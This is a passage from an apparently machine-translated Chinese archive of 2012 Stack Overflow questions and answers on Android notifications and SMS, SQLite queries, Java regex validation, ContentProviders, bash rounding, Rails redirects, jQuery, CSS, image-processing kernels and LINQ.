        Log.d(getClass().getSimpleName(), "entering");
        Toast.makeText(context,sender ,
                Toast.LENGTH_SHORT).show();
        NotificationManager notificationManager =
                                                                               (NotificationManager)                                                                                             context.getSystemService(Context.NOTIFICATION_SERVICE);

                PendingIntent pendingIntent =   PendingIntent.getActivity(context, 0, null, 0);

                Notification notification = createNotification();
                notification.setLatestEventInfo(context,     "Proximity Alert!", "You are near your point of interest.", pendingIntent);

                notificationManager.notify(NOTIFICATION_ID,  notification);
    } else {
        Log.d(getClass().getSimpleName(), "exiting");
       }

         }

        private Notification createNotification() {
    Notification notification = new Notification();

    notification.icon = R.drawable.pushpin;
    notification.when = System.currentTimeMillis();

    notification.flags |= Notification.FLAG_AUTO_CANCEL;
    notification.flags |= Notification.FLAG_SHOW_LIGHTS;

    notification.defaults |= Notification.DEFAULT_VIBRATE;
    notification.defaults |= Notification.DEFAULT_LIGHTS;

    notification.ledARGB = Color.WHITE;
    notification.ledOnMS = 1500;
    notification.ledOffMS = 1500;

    return notification;
       }

  } 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T06:44:05.503

使用广播接收器发送 SMS 的代码是

```
SmsManager sms = SmsManager.getDefault();
    sms.sendTextMessage(phoneNumber, null, body, null, null); 
```

您还需要将此添加到您的清单中

```
<uses-permission android:name="android.permission.SEND_SMS" /> 
```

当您收到接近警报时放置它。

# sqlite - 如何使用 SQLite 从两个表中选择不同的记录，合并到一个列中，并消除另一个表中存在的所有记录？

> ID：13572343
> 
> 赞同：4
> 
> 时间：2012-11-26T20:10:00.107
> 
> 标签：sqlite, join, distinct, union

这是我现有的查询，它成功地从两个表中选择不同的记录并将它们组合成一列：

```
SELECT index_text AS unique_text FROM words
UNION
SELECT c1index_text FROM words_content 
ORDER BY unique_text 
```

现在我想消除所有记录`WHERE body NOT IN (SELECT body FROM sms)`（或者`NOT EXISTS`，任何工作都可以）。问题是，无论我尝试什么，每当我尝试使用括号时都会出现语法错误，或者它无法识别`sms.body`（即使我在每一列之前都放置了它的父表）。我在想一些 SQLite 限制可能使这比它需要的更难，但必须有一个解决方法。**以下是我尝试失败的查询**（我也尝试了这些查询的许多变体但无济于事）：

```
SELECT index_text AS unique_text FROM words
UNION
SELECT c1index_text FROM words_content
  WHERE body NOT IN (SELECT body FROM sms)
ORDER BY unique_text 
```

结果错误：`No such column: body`

```
SELECT words.index_text AS unique_text FROM words
UNION
SELECT words_content.c1index_text FROM words_content
LEFT JOIN sms
  ON sms.body=unique_text
ORDER BY unique_text 
```

结果错误：`No such column: unique_text`

如何加入别名列并仅显示不存在的记录`sms.body`？谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:15:06.083

如果在 UNION 中使用 where 或 join 子句，则必须将它们应用于两个[select](http://www.sqlite.org/lang_select.html)语句。

```
SELECT index_text AS unique_text 
FROM words
where index_text NOT IN (SELECT body FROM sms)
UNION
SELECT c1index_text 
FROM words_content
WHERE c1index_text NOT IN (SELECT body FROM sms)
ORDER BY unique_text 
```

# java - 如何仅扫描一个字符串以查找四个特定字符？

> ID：13572344
> 
> 赞同：-1
> 
> 时间：2012-11-26T20:10:02.160
> 
> 标签：java

我希望用户输入一个 DNA 序列，如果它没有字母 A、C、T 或 G，那么它应该打印出一个错误。但是如何扫描在构造方法 DNASequence 中输入的那些特定字符的字符串？

继承人我到目前为止。

```
import java.util.*;
public class DNASequence {

    private String DNASequence;//create a private static variable that can be accessed

    public static void main(String[] args){

        Scanner input = new Scanner(System.in);

        System.out.println("Please input a sequence of DNA: ");
        String DNAInput = input.nextLine();

    }

    public DNASequence(String DNAStrand){//Constructor Method that takes parameter a string and checks to see if its only A, T, C, G.

        DNASequence = DNAStrand;

        // Invoke the countLetters method to count each letter
        int[] counts = countLetters(DNAStrand.toUpperCase());

        // Display results
        for (int i = 0; i < counts.length; i++) {
          if (counts[i] != 0)
            System.out.println((char)('a' + i) + " appears  " +
              counts[i] + ((counts[i] == 1) ? " time" : " times"));
        }
      }

      /** Count each letter in the string */
      public static int[] countLetters(String s) {
        int[] counts = new int[26];

        for (int i = 0; i < s.length(); i++) {
          if (Character.isLetter(s.charAt(i)))
            counts[s.charAt(i) - 'a']++;
        }

        return counts;
      }

    public String toString(){//Method that just returns the stored sequence
        return DNASequence;

    }

    private static char NucleotideBaseCount(char BaseCount){//Method to count bases

    }

    private static boolean isSubsequenceOf(String DNAStrand){

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:11:52.847

您可以为此使用以下[正则表达式](http://docs.oracle.com/javase/tutorial/essential/regex/)：`^[ACTG]+$`.

要将输入字符串与正则表达式匹配，请使用[`String.matches()`](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#matches%28java.lang.String%29).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:43:16.623

这里是基于 #NPE 评论的示例实现：

```
import java.util.*;

public class DNASequence
{
  private String DNASequence = null; //create a private static variable that can be accessed

  public static void main(String[] args)
  {
    System.out.println("Please input a sequence of DNA: ");
    DNASequence dnaS = new DNASequence((new Scanner(System.in)).nextLine().toUpperCase());
  }

  //Constructor Method that takes parameter a string and checks to see if its only A, T, C, G.
  public DNASequence(String DNAStrand) throws IllegalArgumentException
  {
    if (DNAStrand.matches("^[ATCG]+$"))
    {
      DNASequence = DNAStrand;
    }
    else
    {
      throw new IllegalArgumentException("DNA Sequences should only contain A, T, C, G charaters");
    }

  }

  /** Count each letter in the string */
  public int[] countLetters() throws IllegalArgumentException
  {
    int[] counts = new int[4];

    if (DNASequence != null)
    {
      for (int i = 0; i < DNASequence.length(); i++)
      {
        switch (DNASequence.charAt(i))
        {
          case 'A':
            counts[0]++;
            break;
          case 'T':
            counts[1]++;
            break;
          case 'C':
            counts[2]++;
            break;
          case 'G':
            counts[3]++;
            break;
          default:
            throw new IllegalArgumentException("DNA Sequences should only contain A, T, C, G charaters, found: " + DNASequence.charAt(i));
        }
      }
    }

    return counts;
  }

  //Method that just returns the stored sequence
  public String toString()
  {
    return DNASequence;
  }

  private char NucleotideBaseCount(char BaseCount){//Method to count bases
    return 'a'; // replace with real implementation
  }

  private boolean isSubsequenceOf(String DNAStrand)
  {
    return false; // repalce with real implementation
  }
} 
```

# postgresql - 如何从 XML 文件创建 PostgreSQL 表...

> ID：13572346
> 
> 赞同：0
> 
> 时间：2012-11-26T20:10:04.043
> 
> 标签：postgresql

我有一个 XML 文档文件。该文件的部分如下所示：

```
-<attr>  
     <attrlabl>COUNTY</attrlabl>  
     <attrdef>County abbreviation</attrdef>  
     <attrtype>Text</attrtype>  
     <attwidth>1</attwidth>  
     <atnumdec>0</atnumdec>  
    -<attrdomv>  
        -<edom>  
            <edomv>C</edomv>  
            <edomvd>Clackamas County</edomvd>  
            <edomvds/>  
         </edom>  
        -<edom>  
            <edomv>M</edomv>  
            <edomvd>Multnomah County</edomvd>  
            <edomvds/>  
         </edom>  
        -<edom>  
            <edomv>W</edomv>  
            <edomvd>Washington County</edomvd>  
            <edomvds/>  
         </edom>  
     </attrdomv>  
 </attr> 
```

从这个 XML 文件中，我想创建一个包含 attrlabl、attrdef、attrtype 和 attrdomv 列的 PostgreSQL 表。我很感激你的建议！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T10:48:10.830

虽然 Erwin 认为这可以使用 PostgreSQL 工具完成是对的，但我还是建议您自己进行自定义翻译，因为这里有几个原因。

首先是确定适当的 XML 到 PostgreSQL 类型转换。您可能想自己选择这些。但是这个例子突出了一个非常不同的问题，即如何处理嵌套数据结构。例如，您可以存储 XML 片段。您可以存储文本、json 等。您可以在其中创建其他表和 fkey。

一般来说，我几乎总是发现最好的方法是简单地手动创建表。这用人工判断代替了自动映射，并允许您创建比计算机更好的匹配。

# javascript - jquery mobile的溢出问题

> ID：13572351
> 
> 赞同：0
> 
> 时间：2012-11-26T20:10:41.193
> 
> 标签：javascript, jquery, jquery-mobile

我正在为我的 jquery 移动网站制作菜单面板。可悲的是，我遇到了溢出问题。我想要的是菜单从左侧进入并将jquery移动页面推到右侧并部分在视口之外。

这在桌面浏览器上效果很好，但由于某种原因，我得到了一个水平滚动条，我可以从面板向右“滚动”（进入实际页面）。我当然不想要这种行为。

尝试了各种溢出和位置的东西，但我似乎无法修复它。

我在 jsbin 上的网站上创建了一个精简版：

[http://jsbin.com/uhucec/4](http://jsbin.com/uhucec/4)

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:55:11.003

找到了解决此问题的方法。

我添加了一个 CSS 类：

```
.ui-page-fixed
{
    position: fixed !important;
} 
```

我在面板打开时将此类应用于当前页面，并在面板关闭时将其删除。

# android - 拥有 SQLite 和多个表的 ContentProvider

> ID：13572352
> 
> 赞同：11
> 
> 时间：2012-11-26T20:10:46.507
> 
> 标签：android, android-contentprovider

我正在阅读[本教程](http://www.vogella.com/articles/AndroidSQLite/article.html#contentprovider)，以实现我自己的 ContentProvide 以使用 SQLite。在 ContentProvider.query 中，有几件事让我感到困惑。似乎对一张表（教程中的 todo 表）进行了硬编码，但也许我只是没有得到它？现在，如果我想查询另一个表，比如说 nodo，我将如何更改 ContentProvider？

我应该以某种方式在 queryBuilder.setTables(String inTables) 中附加表名吗？

CONTENT_TYPE 和 CONTENT_ITEM_TYPE 怎么样，每个表都应该有一个吗？

关于 TODO 和 TODO_ID 变量以及查询方法中的开关？

似乎我需要有很多 if/switch 条件来支持具有相同 ContentProvider 的多个表，这是要走的路还是我走错了路？

谢谢索伦_

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-26T21:16:48.450

> 现在，如果我想查询另一个表，比如说 nodo，我将如何更改 ContentProvider？

查询新表意味着您需要添加一个新表`Uri`，因为它`Uri`选择数据源，类似于使用不同的表。

您将基本上为其他表的待办事项添加所有已经存在的硬编码值。例如：

```
// ------- usually the same for all
private static final String AUTHORITY = "de.vogella.android.todos.contentprovider";

// ------- define some Uris
private static final String PATH_TODOS = "todos";
private static final String PATH_REMINDERS = "reminders";

public static final Uri CONTENT_URI_TODOS = Uri.parse("content://" + AUTHORITY
    + "/" + PATH_TODOS);
public static final Uri CONTENT_URI_REMINDERS = Uri.parse("content://" + AUTHORITY
        + "/" + PATH_REMINDERS);

// ------- maybe also define CONTENT_TYPE for each

// ------- setup UriMatcher
private static final int TODOS = 10;
private static final int TODO_ID = 20;
private static final int REMINDERS = 30;
private static final int REMINDERS_ID = 40;
private static final UriMatcher sURIMatcher = new UriMatcher(UriMatcher.NO_MATCH);
static {
  sURIMatcher.addURI(AUTHORITY, PATH_TODOS, TODOS);
  sURIMatcher.addURI(AUTHORITY, PATH_TODOS + "/#", TODO_ID);
  sURIMatcher.addURI(AUTHORITY, PATH_REMINDERS, REMINDERS);
  sURIMatcher.addURI(AUTHORITY, PATH_REMINDERS + "/#", REMINDERS_ID);
}

//@Override
public Cursor query(Uri uri, String[] projection, String selection,
        String[] selectionArgs, String sortOrder) {

    // Using SQLiteQueryBuilder instead of query() method
    SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();

    int uriType = sURIMatcher.match(uri);
    switch (uriType) {

        case TODO_ID:
            // Adding the ID to the original query
            queryBuilder.appendWhere(TodoTable.COLUMN_ID + "="
                    + uri.getLastPathSegment());
            //$FALL-THROUGH$
        case TODOS:
            queryBuilder.setTables(TodoTable.TABLE_TODO);
            break;

        case REMINDERS_ID:
            // Adding the ID to the original query
            queryBuilder.appendWhere(ReminderTable.COLUMN_ID + "="
                    + uri.getLastPathSegment());
            //$FALL-THROUGH$
        case REMINDERS:
            queryBuilder.setTables(ReminderTable.TABLE_REMINDER);
            break;

        default:
            throw new IllegalArgumentException("Unknown URI: " + uri);
  } 
```

> 我应该以某种方式在 queryBuilder.setTables(String inTables) 中附加表名吗？

是的，如果`Uri`从不同的表中读取不同的 s，则根据 Uri 匹配设置表。

> CONTENT_TYPE 和 CONTENT_ITEM_TYPE 怎么样，每个表都应该有一个吗？

取决于实际的内容类型。如果它们不同并且您需要类型是。但你根本不需要拥有它们。该示例定义了它们，但甚至没有使用它们。它需要返回类型`getType`，请参阅[文档](http://developer.android.com/reference/android/content/ContentProvider.html#getType%28android.net.Uri%29)。

> 关于 TODO 和 TODO_ID 变量以及查询方法中的开关？

这些是为 定义的常量，[这里](http://developer.android.com/reference/android/content/UriMatcher.html)`UriMatcher`很好地解释了。它基本上是字符串匹配的简化。一个大的可以有 100 个不同的 Uris，如果你不得不一直写，那么选择正确的表会很痛苦。`ContentProvider``query``if (uri.getPath().equals("todos") { /* code */ } else if (uri..`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-08T19:10:18.413

这是您问题的[解决方案](https://stackoverflow.com/questions/9881758/contentprovider-with-multiple-tables/14779606#14779606)，使用 UriMatcher，您可以在内容提供程序中实现多个表。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-21T17:58:01.910

内容类型和内容项可以如下所示，它们可以包装在每个表的单独类中

`public static final String GENERAL_CONTENT_TYPE = "vnd.android.cursor.dir/vnd.myfirstapp.db.member" ; public static final String SPECIFIC_CONTENT_TYPE = "vnd.android.cursor.item/vnd.myfirstapp.db.member" ;`

`vnd.android.cursor.dir/vnd.yourownanything.anything.tablename'

这定义了一般的内容类型`vnd.android.cursor.item/vnd.anthingasabove.table' 这也定义了具体的并且对于任何应用程序都是常量，那些字符串（单词）vnd.android.cursor.dir和.item必须是像那样和 /vnd 之后。一定是这样的

并且在扩展 contentprovider 的类中，您只需使用相同的 UriMatcher 实例来映射表

# sql-server - 如何附加我的本地 SQL 服务器数据库？

> ID：13572353
> 
> 赞同：0
> 
> 时间：2012-11-26T20:10:52.827
> 
> 标签：sql-server, visual-studio-2012

通常我在 Visual Studio 中做所有事情，但这次我想在 Management Studio 中创建我的数据库，然后将它附加到 VS 中以在我的项目中使用。

我有 SQL Server 2012 速成版和 VS2012 终极版。

我在 managemane studio 中创建了一个名为 Breakspeare 的数据库，当我尝试在 VS 中附加它（尝试创建连接字符串）时出现错误。

我进入服务器资源管理器，其中列出了我的服务器（本地电脑名称）我单击添加新数据连接并选择 microsoft sql server 作为数据源，然后在服务器列表中单击我的服务器并在数据库下拉列表中显示类似“更新列表”的内容大约 30 秒，然后返回“与 sql server 建立连接时发生与网络相关的特定于实例的错误”

我检查了它是否设置为允许远程连接，确实如此，所以出了什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T09:58:34.507

原来我只是缺少服务器名称中的实例名称 \SQLEXPRESS。

# bash - BASH 将浮点数舍入到最接近的十分之一

> ID：13572355
> 
> 赞同：4
> 
> 时间：2012-11-26T20:10:56.557
> 
> 标签：bash, decimal, rounding

如何使用 bc 将浮点数舍入到最接近的十分之一。我有一个名为 loadMin 的变量

```
loadMin=$(uptime | cut -d" " -f14 | cut -c 1-4) 
```

它返回每分钟的负载平均值，小数点后两位。即 0.01 0.02 0.09。我需要将数字四舍五入到最接近的十分之一。例如 0.01 四舍五入为 0.0 或 1.09 四舍五入为 1.1

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-26T20:15:57.330

为什么使用`bc`？`printf`很乐意这样做：

```
printf "%.1f" "$loadMin" 
```

如果您需要将结果放入变量中：

```
printf -v variable "%.1f" "$loadMin" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:15:48.017

您可以一次性完成`awk`：

```
loadMin=$(uptime | awk '{printf "%0.1f", $14}') 
```

**解释：**

*   代替使用`cut`，使用`awk`代替使这些更容易
*   `awk`默认情况下分隔空格和制表符，并将每行分隔为字段。
*   `'{printf "%0.1f", $14}'`：将第 14 个字段打印为浮点数，四舍五入到最接近的小数点后 1 位。

# ruby-on-rails - Rails嵌套表单重定向问题

> ID：13572372
> 
> 赞同：0
> 
> 时间：2012-11-26T20:12:02.507
> 
> 标签：ruby-on-rails, forms, redirect, nested

我正在使用注册过程创建应用程序，如下所示：

1.  用户注册他们的公司（父帐户）并以相同的形式创建他们的用户帐户（子帐户）。
2.  用户登录并为其他员工添加其他子帐户。

每个公司帐户都充当连接所有用户帐户的“包装器”。

我已经完成了这项工作，但似乎无法在用户提交表单后将代码重定向回应用程序的根 url。目前，它们正被转发到公司指数。

谢谢！

**我的两个模型：**

```
class Company < ActiveRecord::Base
  attr_accessible :name, :address1, :address2, :city, :state, :zip, :users_attributes

  has_many :projects, :dependent => :destroy
  has_many :users, :dependent => :destroy

  accepts_nested_attributes_for :users
end

class User < ActiveRecord::Base
  authenticates_with_sorcery!

  attr_accessible :email, :password, :password_confirmation, :first_name, :last_name, :created_on, :company_id

  belongs_to :company
  has_many :comments
  has_many :tasks

  validates_confirmation_of :password
  validates_presence_of :password, :on => :create
  validates_presence_of :email
  validates_uniqueness_of :email

end 
```

**公司控制人**

```
 def new
    @company = Company.new
    @company.users.build
  end

  def create
    @company = Company.new(params[:company])

    if @company.save
      redirect_to root_url
    else
      render action: "new"
    end
  end 
```

**和形式**

```
<%= simple_form_for(@company) do |f| %>
  <%= f.error_notification %>

  <%= f.simple_fields_for :users do |u| %>
    <%= u.input :first_name %>
    <%= u.input :last_name %>
    <HR>
    <%= u.input :email %>
    <%= u.input :password %>
    <%= u.input :password_confirmation %>
  <% end %>

  <div class="form-inputs">
    <%= f.input :name %>
    <%= f.input :address1 %>
    <%= f.input :address2 %>
    <%= f.input :city %>
    <%= f.input :state %>
    <%= f.input :zip %>
  </div>

  <div class="form-actions">
    <%= f.button :submit %>
  </div>
<% end %> 
```

**编辑：**

我的路线

```
 resources :password_reset

  get "logout" => "sessions#destroy", :as => "logout"
  get "login" => "sessions#new", :as => "login"
  get "adduser" => "users#new", :as => "adduser"
  resources :users
  resources :sessions

  resources :companies
  get "signup" => "companies#new", :as => "signup"

  resources :comments

  root :to => "projects#index"

  resources :tasks do
    member do
      get :change
    end
  end

  resources :phases

  resources :projects 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T23:03:57.890

只需重定向到“/”路径，而不是使用快速修复的路线。

**公司控制人**

```
def new
  @company = Company.new
  @company.users.build
end

def create
  @company = Company.new(params[:company])

  if @company.save
    redirect_to '/'
  else
    render action: "new"
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:16:18.827

routes.rb 中定义了什么？

可能你忘了把它改成你想要的 root_url

# android - 让 APK 文件正常工作

> ID：13572375
> 
> 赞同：0
> 
> 时间：2012-11-26T20:12:10.650
> 
> 标签：android, adb

我知道要在您键入的模拟器上安装 apk 文件，

```
adb install [apk file name] 
```

所以，我跟着我收到了这个错误，

```
antz@antz-90X3A:~/Android/androidmalware$ adb install 01_AngryBirdsRiov110.apk   
error: device not found  
- waiting for device - 
```

当我检查 android android 虚拟设备时，我有一个设备。

我必须链接其他东西吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:33:35.730

运行模拟器的命令是：

```
emulator -avd <youravd.avd> 
```

听起来您没有模拟器或设备连接到您的计算机。您可以通过键入以下内容来检查您是否有可用的设备：

```
adb devices 
```

仅仅因为您创建了 AVD 并不意味着它正在运行。您需要使用您创建的 AVD 启动模拟器。

# jquery - 选择手风琴菜单悬停效果时变慢

> ID：13572377
> 
> 赞同：0
> 
> 时间：2012-11-26T20:12:26.047
> 
> 标签：jquery

我的问题是，当您从一个选项卡转到另一个选项卡时，如何更慢地实现悬停效果？

```
if ($('#section ul').length) {
    $("#section ul").accordion({
        event: "mouseover",
        active: 1,
        collapsible: false,
        autoHeight: false,
        animated: 'swing',
        duration: 1000
    }).mouseleave(function() {
        $(this).accordion('activate', "#mainmenu");
    });
} 
```

示例：http: [//jsfiddle.net/jphuP/](http://jsfiddle.net/jphuP/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:22:51.867

更改`duration`为`animate`：[API](http://api.jqueryui.com/accordion/)

# css - 相对于屏幕分辨率的图像宽度

> ID：13572378
> 
> 赞同：0
> 
> 时间：2012-11-26T20:12:40.820
> 
> 标签：css

我刚刚浏览了这个网站：

[http://www.morphix.si/#home](http://www.morphix.si/#home)

我想知道如何将图像宽度调整为屏幕分辨率？（或者换句话说：他们如何安排 CSS 以使其在每个屏幕上看起来都一样？）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:18:32.313

如果您在谈论`background-image`比这里是 CSS3 解决方案

```
background: url(images/image.jpg) no-repeat center center fixed; 
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover; 
```

此外，如果您对设计与每个屏幕兼容的布局感兴趣，您可以使用特定于屏幕分辨率的@media 查询，通常用于响应式设计，例如

```
@media only screen and (min-device-width : 320px) and (max-device-width : 480px) {
  /* Styles goes here */
} 
```

# share - Blogger (Blogspot) 分享按钮来统计主页上的单个帖子页面

> ID：13572382
> 
> 赞同：3
> 
> 时间：2012-11-26T20:12:46.217
> 
> 标签：share, blogger, facebook-social-plugins, blogspot, share-button

我在博客（blogspot）平台上有博客。查看主页时，每个帖子的分享按钮旁边的数字仅显示通过每个社交按钮分享主页的次数。

有没有办法显示每个帖子被分享的准确数量，而不仅仅是主页？

例如，[http](http://mashable.com/) : //mashable.com/ 为主页上的各个帖子显示准确的社交媒体编号。然而，[http](http://dmw-test-blog.blogspot.com/) ://dmw-test-blog.blogspot.com/ 只显示主页被分享的次数，尽管按钮显示在每个帖子标题下。

我一直在寻找几个小时的解决方案。一些人建议不要将脚本放在 </head> 标签下，另一些人建议使用来自每个社交共享网站的单独脚本而不是第 3 方 ShareThis 脚本，但这些建议都不起作用。

有解决方案还是 Blogger 平台是问题所在？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-27T08:11:14.587

我找到了解决方案。

通过使用 ShareThis 中的第 3 方分享按钮，他们有一个调整，您可以在其中添加：“expr:st_title='data:post.title'expr:st_url='data:post.url'”到每个按钮，强制分享按钮显示帖子标题 url 的编号，而不是浏览器 url。

例如，使用上面的共享按钮，新代码将如下所示：

```
<span class='st_twitter_hcount' expr:st_title='data:post.title' expr:st_url='data:post.url'/>

<span class='st_facebook_hcount' expr:st_title='data:post.title' expr:st_url='data:post.url'/>

<span class='st_googleplus_hcount' expr:st_title='data:post.title' expr:st_url='data:post.url'/>

<span class='st_linkedin_hcount' expr:st_title='data:post.title' expr:st_url='data:post.url'/> 
```

# python - 高斯核的一般拉普拉斯算子

> ID：13572383
> 
> 赞同：1
> 
> 时间：2012-11-26T20:12:46.967
> 
> 标签：python, image-processing, laplacianofgaussian

我很难实现高斯核的拉普拉斯算子。我有以下代码，我正在尝试使用 sigma = 1.4 实现 9x9 内核。内核显示在此链接上

[http://homepages.inf.ed.ac.uk/rbf/HIPR2/log.htm](http://homepages.inf.ed.ac.uk/rbf/HIPR2/log.htm)

但是，我的值与该内核中的值完全不同，我认为我的功能已关闭。帮助将不胜感激。谢谢你。

```
import math
pi= math.pi
log = [[0 for x in range(9)] for x in range(9)]
def genlog(log,size,o):
    for i in range(-size/2,size/2):
        for j in range(-size/2,size/2):
            log[i][j] = -(pi*o**4)**(-1)*(1-(i**2+j**2)/(2*o**2))*math.exp(-(i**2+j**2)/(2*o**2))
def printlog(log,size):
    for i in range(-size/2,size/2):
        print ' '.join(str(log[i][j]) for j in range(-size/2,size/2))

genlog(log,9,1.4)
printlog(log,9) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-07-21T08:13:39.713

这个问题已经有三年了，所以我不知道它是否有用，但我在 excel 中实现了引用的算法，发现你的函数应该这样写：

```
log[i][j] = (-1)/(pi*o**4)*(1-(i**2+j**2)/(2*o**2))*math.exp(-(i**2+j**2)/(2*o**2)) 
```

也应该使用缩放因子来考虑源图像的大小。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:16:55.493

您的代码一开始很难阅读，但对于初学者来说，您有：

```
log[i][j] = (pi*o**4)**.5*... 
```

根据您的公式，什么时候应该是：

```
log[i][j] = -(pi*o**4)**(-1)*... 
```

将某些东西提高到`.5`实际上是一个平方根。你要找的是倒数，把它提高`-1`. 此外，您忘记将其设为负数。

# javascript - 网站上的动态表格

> ID：13572387
> 
> 赞同：2
> 
> 时间：2012-11-26T20:12:55.430
> 
> 标签：javascript, jquery, ajax, forms

嗨，我试图在按下编辑按钮时显示一个表单，然后一旦按下表单的保存按钮，我想编辑我的数据库并显示新信息。我也需要在不刷新页面的情况下执行此操作。我是 jquery 的新手，但下面是我到目前为止所写的内容，但是 event.preventDefault(); 功能由于某种原因无法正常工作，并且表单操作正在运行。任何有关我的代码失败原因的帮助将不胜感激，谢谢！

```
<!doctype html>
<html lang="en">
<head>
<!-- Irrelevant scripts from the site go here -->
</head>
<body>
<!-- Lots of other code from the site is here -->
<div id="jqueryFunction"></div>
<script text="text/javascript">
    function checkEdit(ID){
        //Check the fields make sure they're not empty
        return true;
    }
</script>
<script text="text/javascript">
    function editV(ID, titleOld, descOld){
        document.getElementById("divForm" + ID).innerHTML = 
        "<form name=\"editDiv" + ID + "\" id=\"editDiv" + ID + "\" onsubmit=\"return checkEdit(" + ID + ");\" action=\"editvid.php\" method=\"POST\">" +
        "<input type=\"hidden\" name=\"divID\" id=\"divID\" value=\"" + ID + "\"/>" +
        "<input type=\"text\" name=\"titleNew" + ID + "\" id=\"titleNew" + ID + "\" value=\"" + titleOld + "\"/><br>" +
        "<textarea name=\"descNew" + ID + "\" id=\"descNew" + ID + "\">" + descOld + "</textarea><br>" +
        "<input type=\"submit\" value=\"Save\" class=\"alt_btn\">" +
        "</form>";
        document.getElementById("jqueryFunction").innerHTML = 
        "<script src=\"js/jquery-1.5.2.min.js\" type=\"text/javascript\"><\/script>" +
        "<script>" +
            "$(function(){" +
                "$('form[name=\"editDiv" + ID + "\"]').on('submit', function(event){" +
                    "event.preventDefault();" +
                    "var form = this;" +
                    "$.ajax({" +
                        "url: $(form).attr('action')," +
                        "type: \"POST\"," +
                        "data: {divID:$(form.divID).val(), titleN:$(form.titleNew).val(), descN:$(form.descNew).val()}," +
                        "success: function (response) {" +
                            "alert('response');" +
                        "}" +
                    "});" +
                "});" +
            "});" +
        "<\/script>";
    }
</script>
</body> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:28:22.170

有许多更清洁的解决方案。我只是隐藏表单，然后通过单击编辑来显示它。这是一个获取父母 ID 的示例。

```
<!DOCTYPE HTML>
<html>
<head>
<title>Test</title>

<style>
    .editForm {
        display:none;
    }
</style>
<script>
</script>

</head>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script>
$(document).ready(function() {

    $('.edit').click(function() {
        $('.editForm').fadeIn();
    });

    $('a.submit').click(function() {

        // get parents id
        var parentId = $(this).parent().parent().parent().attr('id');

        $.ajax({
          type: "POST",
          url: "some.php",
          data: { divId: parentId, aName: $('.aName').val() }
        }).done(function( msg ) {
          alert( "Data Saved: " + msg );
        });
    });

});
</script>

<body>

<div id="anId">
    <a class="edit">edit</a>
    <form class="editForm">
        <div>
            <input type="text" class="aName" />
            <a href="#" class="button submit">Submit</a>
        </div>
    </form>
</div>
</body>
</html> 
```

# c# - 如何使用 LINQ 在 ComboBox 中显示不同的属性值？

> ID：13572390
> 
> 赞同：1
> 
> 时间：2012-11-26T20:13:02.223
> 
> 标签：c#, wpf, linq, dynamic-linq

这是 Book 类 **Book{BookId, Title, Category, Quantity};** 那么，如何使用 linq 查询从每个类别中仅选择一个对象？我试过这样，

```
this.catagoryList.DataContext = ldc.Books.Distinct(); //categoryList is a ComboBox 
```

但你知道它不起作用。所有这些对象都是独一无二的，因此它多次显示相同的类别。实际上我希望它像 GroupBy，但我想从每个组中只选择一个对象以在 ComboBox 中显示唯一的类别。谢谢。

XAML：

```
 <DataTemplate x:Key="CatagoryTemplate">
          <StackPanel Orientation="Horizontal">
            <TextBlock Text="{Binding Path=Catagory}"/>
          </StackPanel>
    </DataTemplate>
...
 <ComboBox Name="catagoryList" ItemsSource="{Binding}" ItemTemplate="{StaticResource CatagoryTemplate}" SelectionChanged="catagoryList_SelectionChanged" IsSynchronizedWithCurrentItem="True"/>
... 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:15:06.663

```
this.catagoryList.DataContext = ldc.Books.Select(b => b.Category).Distinct(); 
```

如果您不想更改模板：

```
catagoryList.DataContext = ldc.Books.Select(b => b.Category)
                                    .Distinct()
                                    .Select(c => new { Catagory = c }); 
```

但我认为最好更改模板以匹配字符串。

```
<DataTemplate x:Key="CatagoryTemplate">
      <StackPanel Orientation="Horizontal">
        <TextBlock Text="{Binding}"/>
      </StackPanel>
</DataTemplate> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:20:43.877

虽然这段代码的上下文不清楚，但一般来说，您应该不理会 ComboBox 的 DataContext 并将其 ItemsSource 属性绑定到视图模型中返回 linq 查询的属性。

也就是说，在您的特定代码中，您只需在调用 Distinct() 之前选择（）类别：

> this.catagoryList.DataContext = ldc.Books.Select(book=>book.Category).Distinct();

编辑：

只需删除您的 DataTemplate，它没有用。如果您将 DataContext 设置为上面的 LINQ 查询，然后按照您的操作将 ItemsSource 绑定到 DataContext，它将正确显示字符串列表。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:14:38.360

```
ldb.Books.Select(b=>b.Category).Distinct() 
```

# php - 将数据从mysql导出到excel并通过android下载

> ID：13572392
> 
> 赞同：0
> 
> 时间：2012-11-26T20:13:09.993
> 
> 标签：php, android, mysql, excel

我想将数据从 MySQL 导出到 excel 文件。一旦文件在 android 设备中创建下载文件。我通过此代码创建 excel 文件：

```
